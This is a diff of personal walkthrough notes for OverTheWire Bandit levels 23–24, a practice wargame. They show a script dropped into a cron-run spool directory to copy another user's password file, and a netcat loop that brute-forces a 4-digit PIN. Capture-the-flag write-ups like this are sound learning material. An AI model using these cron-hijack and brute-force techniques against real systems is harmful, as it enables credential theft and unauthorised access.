@@ -243,9 +243,42 @@ Level 23
 A program is running automatically at regular intervals from cron. Look in
 /etc/cron.d/ for the configuration and see what command is being executed.
 
+//create a temporary working directory
+mkdir /tmp/mahdir/
+cd /tmp/mahdir/
+
 NOT WORKING YET
 //the cronjob executes all scripts in /var/spool/bandit24 then deletes them.
-//write the following
-cat /etc/bandit_pass/bandit24 > /tmp/bleh.txt
+//write the following, took me like a day to figure out bash needed >> not >
+mahscript.sh:
+	#!/bin/sh
+	cat /etc/bandit_pass/bandit24 >> /tmp/mahdir/pass.txt
 
-chmod 777 /var/spool/bandit24/script.h
+//ensure bandit24 can run it by changing permissions
+chmod 777 mahscript.sh
+//create the output file and make sure bandit24 can write to it
+vim pass.txt
+chmod 666 pass.txt
+//move it to the necessary directory
+cp mahscript.sh /var/spool/bandit24
+
+Level 24
+--------
+A daemon is listening on port 30002 and will give you the password for bandit25
+if given the password for bandit24 and a secret numeric 4-digit pincode. There
+is no way to retrieve the pincode except by going through all of the 10000
+combinations.
+
+//need to write a bash script
+vim bandit24.sh
+PASS=<bandit24Pass>
+//loop through all posibilities use printf to pad the pincode to 4 digits
+//and ensure you terminate the string like netcat likes with \r\n\r\n
+for i in {0..9999}
+do
+ 	printf "%s %04d\r\n\r\n" $PASS $i
+done
+
+./bandit24.sh | nc localhost 30002 > response.txt 
+sort response.txt | uniq
+//and the answer will be in the output
